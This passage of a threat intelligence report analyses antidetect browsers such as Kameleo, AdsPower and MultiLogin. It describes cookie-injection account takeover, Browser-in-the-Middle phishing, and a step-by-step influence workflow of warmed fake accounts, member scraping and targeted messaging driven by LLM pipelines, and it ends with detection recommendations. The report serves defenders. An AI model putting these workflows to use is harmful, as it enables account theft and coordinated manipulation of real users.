At the session layer, Kameleo’s dedicated cookie injection API accepts complete cookie objects including session IDs, refresh tokens, and authentication flags, allowing a pre-authenticated session state to be inserted into a profile before it is launched. The platform sees the profile as an already-authenticated user, with no login event occurring to trigger anomaly detection. As independently documented by threat intelligence research and confirmed by security researchers, this workflow is established and active in the criminal ecosystem. Figure 6 shows a recruitment post on a Russian-language underground forum advertising a multifunctional infostealer with RAT capabilities explicitly designed to operate within antidetect browser environments, listing Kameleo, AdsPower, and MultiLogin among 21 compatible platforms capable of harvesting session cookies, authentication tokens, cryptocurrency wallets, API keys, and 2FA credentials.

Figure 6 – A recruitment post on a Russian-language underground forum lists 21 browsers including Kameleo, AdsPower, and MultiLogin as compatible platforms.

As seen in Figure 7, a threat actor on a Russian-language underground hacking forum explicitly introduces Kameleo as a component of Browser-in-the-Middle phishing kits targeting credentials across Google, Microsoft, Facebook, and financial platforms. In a Browser-in-the-Middle attack, the phishing server instructs the antidetect browser to create a new profile for the victim, assigned a residential proxy in their country and a clean device fingerprint. The victim’s credentials, entered on the phishing page, are passed in real time into the real login page of the target service through an automation framework. The target platform sees a login attempt from a consistent, locally coherent device with a residential IP address in the expected country, none of the signals that would trigger a security challenge or step-up authentication.

Figure 7 – A post on a Russian-language underground hacking forum introducing Kameleo as a component of Browser-in-the-Middle phishing kits targeting credentials across Google, Microsoft, Facebook, and financial platforms.

AdsPower

Chinese in origin and subsequently registered across multiple jurisdictions and localized into more than 20 languages, AdsPower applies fingerprint spoofing logic across more than 20 configurable parameters per profile and advertises a 99.2% ban avoidance rate. As seen in Figure 8, its proxy editor provides a built-in catalog of compatible third-party residential and rotating proxy providers, assignable directly within the profile creation interface. Figure 9 illustrates the granularity of fingerprint control available, with each profile’s WebRTC handling, time zone, geolocation, and language individually configurable to ensure the synthetic identity is consistent across every detectable signal.

Figure 8 – AdsPower’s proxy integration interface lists compatible third-party residential and rotating proxy providers available within the platform.

Figure 9 – AdsPower’s fingerprint editor displaying granular per-profile identity parameters including WebRTC, timezone and location derived from the assigned proxy IP.

The scale of AdsPower’s intended use is reflected in its pricing structure, with published tiers supporting up to 5,000 distinct profiles as seen in Figure 10, and enterprise arrangements available on request. As seen in Figure 11, its account editor supports platforms spanning social media, e-commerce, financial services, and professional networks including Facebook, Amazon, LinkedIn, X, PayPal, and Google.

Figure 10 – AdsPower’s pricing table reflects the intended operational scale, with enterprise tiers supporting more than 5,000 profiles available upon request.

Figure 11 – AdsPower’s account editor shows supported platforms available for bulk profile management, including Facebook, Amazon, LinkedIn, X, PayPal, and Google.

Scalability is further addressed through a built-in RPA engine and a dedicated Marketplace, as seen in Figure 12, offering pre-built templates for automated liking, commenting, direct messaging, follower scraping, and AI-assisted engagement across hundreds of profiles simultaneously. The multi-window synchronizer replicates identical actions across hundreds of profiles from a single input, while account warming automation builds synthetic activity histories over weeks to reduce platform suspicion before deployment.

Figure 12 – AdsPower’s RPA Marketplace lists pre-built automation templates for bulk account activity across major platforms, including automated liking, commenting, direct messaging, follower scraping, and AI-assisted engagement.

On the AI front, AdsPower advertises a dedicated Model Context Protocol server enabling direct integration with large language model workflows, creating a pipeline in which AI-generated content can be produced, injected into pre-warmed account profiles, and distributed across platforms in a fully automated sequence requiring no human involvement. A companion feature, the Cookie Robot, automates cookie warming on TikTok and Twitter/X accounts prior to operational use. The RPA Marketplace is the delivery mechanism for this pipeline, with ready-to-deploy workflows designed to operate in direct combination with AI-generated content, resulting in an end-to-end operation at a scale and speed previously associated only with state-sponsored actors.

As seen in Figure 13, AdsPower’s own published scraping guide explicitly acknowledges that scraping Facebook constitutes a violation of the platform’s terms of service and may result in legal action, before advising users that an antidetect browser can help bypass these limitations.

Figure 13 – AdsPower’s official scraping guide advises users that an antidetect browser can help bypass scraping limitations.

MultiLogin

MultiLogin operates as a fully featured antidetect browser platform, offering isolated browser profiles with unique device fingerprints covering canvas output, WebGL parameters, fonts, timezone, screen resolution, and user agent, with each profile maintaining separate cookies, local storage, and session data. The platform supports automation through Selenium, Playwright, and Puppeteer, enabling fully scripted, headless operation of multiple profiles simultaneously. MultiLogin has been referenced on Exploit, a Russian-language underground hacking forum, in a thread dedicated to antidetect browsers, indicating active discussion and adoption of the platform within criminal communities (see Figure 6).

MultiLogin extends its multi-account capability into the mobile layer through a phone farming infrastructure that replaces physical Android devices with cloud-hosted equivalents. Every cloud Android profile maintains its own persistent mobile device parameters, with proxies assigned per profile to control location and network identity. MultiLogin’s own documentation states that most account bans in phone farm environments occur due to multiple accounts sharing the same device signals, storage, or network patterns, and positions its product as the solution to this detection problem, an explicit acknowledgment that the platform is designed to defeat association detection at the mobile layer.

According to their website, virtual phone number provisioning through partner integrations enables SMS-based account verification without physical SIM cards or mobile devices. Each virtual number is paired with a mobile device fingerprint profile, enabling the rapid creation of large volumes of accounts that appear to originate from distinct mobile devices across different geographic locations.

MultiLogin maintains a dedicated web scraping solution page and publishes operational guides for scraping platforms including Facebook, LinkedIn, Amazon, and Twitter, with its built-in residential proxy infrastructure marketed as enabling scraping operations that bypass bot detection and IP-based rate limiting. Its stated use cases listed on its own website include ticket scalping automation, a practice explicitly illegal in multiple jurisdictions and prohibited by major ticketing platforms, with the platform’s infrastructure documented as tested daily against major ticketing services for compatibility. MultiLogin additionally lists AI Quick Actions Automation among its documented product capabilities, indicating a degree of AI integration into its operational workflow.

As seen in Figure 14, MultiLogin’s payment infrastructure accepts cryptocurrency alongside credit card payments and regional systems including SberPay and YooMoney. Notably, YooMoney has been designated on the OFAC Specially Designated Nationals list since April 2022 under Executive Order 14024 as a Sberbank subsidiary, and SberPay operates as a product of Sberbank, itself under comprehensive OFAC blocking sanctions since February 2022. The acceptance of these payment methods, alongside cryptocurrency, enables anonymous and potentially sanctions-non-compliant transactions. MultiLogin offers 24/7 support through dedicated Telegram channels staffed by human representatives and is tested daily against more than 50 major social media platforms to ensure continued compatibility. Taken together, MultiLogin’s mobile infrastructure, AI automation layer, scraping capabilities, criminal community presence, and payment infrastructure make it one of the most operationally complete platforms in this category.

Figure 14 – MultiLogin’s payment infrastructure accepts a variety of different payment services.

AI-Powered Campaign Infrastructure

The most consequential recent development is AI integration directly into the operational stack. AdsPower advertises a dedicated Model Context Protocol server enabling direct integration with large language model workflows, creating a pipeline in which AI-generated content can be produced, injected into pre-warmed account profiles, and distributed across platforms in a fully automated sequence requiring no human involvement. A companion feature, the Cookie Robot, automates cookie warming on TikTok and Twitter/X accounts prior to operational use, simulating browsing behavior to establish account credibility before the content distribution phase begins.

The RPA Marketplace mentioned in the previous section is the delivery mechanism for this pipeline. Available templates contain ready-to-deploy workflows maintained and updated by the vendor, designed to operate in direct combination with AI-generated content. This creates an end-to-end influence operation pipeline that requires no active operator presence once the campaign is initiated. The result is a single automated workflow that places coordinated influence operation capacity within reach of any sufficiently motivated actor, regardless of resources or technical expertise.

Web Scraping as Operational Intelligence

The web scraping capabilities documented across these platforms serve a function that extends well beyond data collection. Scraped data is the intelligence layer that makes the operation more precise. Several of the tools we reviewed maintain dedicated scraping solution pages describing capabilities including fingerprint rotation, CAPTCHA bypass, and headless browsing designed to extract data from platforms including LinkedIn, Amazon, Facebook, and Twitter while evading their anti-scraping defenses. As seen in Figure 13, the AdsPower published scraping guide explicitly acknowledges that scraping Facebook constitutes a violation of the platform’s terms of service and may result in legal action, before advising users that an antidetect browser can help bypass these limitations.

The combination of well-farmed personas and targeted scraping capabilities enables a precision influence operation at scale.

Workflow:

An artificial account, warmed up over several weeks of simulated activity, accumulates sufficient credibility to be accepted into a closed group on a social media platform.

Once inside, the platform’s scraping infrastructure extracts available information on every member, including names, profile data, religious affiliations, political interests, age, geographic markers, and engagement patterns.

The harvested dataset becomes the targeting intelligence for a bulk coordinated campaign, allowing artificial personas to engage each member with content calibrated to their specific profile, amplify narratives that resonate with the group’s demonstrated interests, and simulate the kind of peer validation that drives genuine behavioral change.

A Sophisticated and Professionally Maintained Ecosystem

The commercial availability of these tools reflects a fundamental shift in the influence-operation threat landscape: what was once the domain of well-resourced state actors and advanced persistent threat groups is now accessible to any motivated individual with a credit card. These are all professionally maintained, customer-supported, multilingual software platforms with pricing pages, knowledge bases, release notes, and dedicated sales teams. The only barrier to running a large-scale coordinated inauthentic operation is not a user’s technical sophistication but the need to pay a subscription fee.

The language coverage and market reach of these tools reflects the scale of their intended user base. AdsPower is available in 20 languages. MultiLogin supports English, Chinese, Russian, Vietnamese, and Portuguese, and is tested daily against more than 50 platforms. Kameleo maintains a public blog catalog of dedicated technical guides on bypassing Cloudflare bot detection, defeating DataDome, and solving Cloudflare Turnstile challenges, which are all security systems deployed specifically to identify and block automated or inauthentic browser sessions.

The customer support infrastructure surrounding these tools mirrors that of legitimate enterprise software, with MultiLogin offering 24/7 support through dedicated Telegram channels staffed by human representatives. As seen in Figure 14, MultiLogin’s payment infrastructure accepts cryptocurrency alongside credit card payments and regional systems including SberPay and YooMoney, both Russian payment services.

As seen in Figure 15, independent threat actors have developed and are actively selling purpose-built antidetect solutions on underground forums, complete with feature documentation, technical support, and monthly subscription pricing. This particular tool targets Android devices specifically, offering automated geolocation spoofing, device ID replacement, Wi-Fi environment manipulation, and Play Integrity bypass at 100 USD per month, reflecting the breadth of threat actor demand across different device categories and operational requirements.

As seen in Figure 16, the downstream commercial activity built on this infrastructure extends to farmed platform accounts advertised for sale on underground forums alongside explicit instructions to access them using antidetect browsers. Cryptocurrency is the default payment method. These posts confirm a mature commercial underground market in which these antidetect tools function as the operational backbone of a broader fraud and influence ecosystem.

Figure 15 – An antidetect tool designed for Android devices advertised on an underground forum, offers automated geolocation spoofing, device ID replacement, and Play Integrity bypass at 100 USD per month.

Figure 16 – Farmed Google Ads accounts advertised for sale on an underground forum.

Conclusion

The antidetect browser ecosystem represents a sophisticated, commercially mature, and increasingly AI-driven infrastructure that has fundamentally lowered the barrier to running scam and fraud operations, as well as coordinated inauthentic operations at scale. These commercially maintained tools are available in dozens of languages, backed by customer support teams, tested daily against the world’s largest social media platforms, and are now integrated with LLM pipelines that remove the human operator from the execution layer. The coupling of identity spoofing infrastructure, automated content distribution, and AI-assisted persona management represents a threat surface that platform detection systems may struggle to address, particularly in the context of elections taking place across multiple countries.

The infrastructure we documented is commercially available today. Its capabilities are not constrained by technical sophistication, national resources, or operational scale. The question is no longer whether these tools are being actively used for fraud, account takeover, and coordinated manipulation, but whether the detection, enforcement, and awareness frameworks across every layer of the ecosystem are prepared to counter them.

Recommendations

Security and threat intelligence teams:

The detection priority should shift from the account and behavioral layer, where these tools are already designed to appear invisible, to the network and infrastructure layer.

Indicators include residential proxy infrastructure operating at scale, WebRTC suppression patterns, anomalous cookie injection sequences, and known antidetect browser user agent strings in web traffic logs.

Account warming patterns, simulated by these tools over several weeks, may be indistinguishable from legitimate organic behavior without cross-referencing device fingerprint consistency over time.

Social media platforms:

Antidetectbrowser infrastructure should be treated as a first-class priority.

The capabilities operate below existing detection thresholds, and infrastructure-layer signals may be the only reliable detection surface available.

Platforms should consider actively acquiring and reverse engineering antidetect tools to map their proxy patterns, fingerprint rotation behaviors, and detection bypass mechanisms, and use those findings to recalibrate banning logic specifically against these tools’ TTPs.

CISOs and companies:

The risk posed by antidetect browser infrastructure extends well beyond influence operations.

Silent account takeover using cookie injection workflows can bypass multi-factor authentication without generating a login event.

Organizations are advised to review whether their session monitoring infrastructure can detect pre-authenticated session anomalies, and to incorporate antidetect-specific attack scenarios into red team exercises and threat models.

Threat actors can leverage antidetect browsers to replicate victim device fingerprints and geolocation to execute unauthorized transactions without triggering behavioral anomaly detection.

Fraud detection systems that rely on device consistency and session continuity signals should be specifically reviewed for resilience against fingerprint spoofing and session injection at the identity infrastructure layer.
